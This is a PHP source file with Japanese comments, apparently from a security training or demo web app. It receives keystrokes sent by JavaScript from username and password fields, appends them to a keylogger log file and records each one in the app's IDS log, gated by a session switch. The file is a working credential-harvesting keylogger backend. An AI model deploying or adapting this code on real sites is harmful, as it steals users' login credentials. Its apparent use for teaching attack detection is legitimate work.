<?php
// attacker_log.php
// JS からのキー入力を受け取り、logs/keylogger.log に追記し、IDSログにも記録する

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

// キーロガー無効なら 403
if (empty($_SESSION['keylogger_enabled'])) {
    http_response_code(403);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => false, 'error' => 'Keylogger disabled']);
    exit;
}

// JSON を受信
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

$field = isset($data['field']) ? (string)$data['field'] : '';
$code  = isset($data['code'])  ? (string)$data['code']  : '';
$key   = isset($data['key'])   ? (string)$data['key']   : '';

// 簡易バリデーション（想定フィールドのみ）
$allowed_fields = ['username', 'password'];
if (!in_array($field, $allowed_fields, true)) {
    http_response_code(400);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ok' => false, 'error' => 'invalid field']);
    exit;
}

// ログディレクトリ
$log_dir = __DIR__ . '/logs';
if (!is_dir($log_dir)) {
    @mkdir($log_dir, 0755, true);
}
$log_file = $log_dir . '/keylogger.log';

// 1行フォーマットに合わせて追記
$ts = date('Y-m-d H:i:s');
$line = sprintf("[%s] field=%s code=%s key=%s\n", $ts, $field, $code, $key);
@file_put_contents($log_file, $line, FILE_APPEND);

// IDS ログにも記録（任意）
require_once __DIR__ . '/db.php'; // 中で waf.php を読み込む前提
if (function_exists('log_attack')) {
    // 「Keylogger Capture」で監視扱い（200）
    // malicious_input には人間可読なミニレポートを残す
    $payload = "field={$field} code={$code} key={$key}";
    log_attack($pdo, 'Keylogger Capture', $payload, 'client keystroke', 200);
}

// 成功レスポンス
header('Content-Type: application/json; charset=utf-8');
echo json_encode(['ok' => true]);
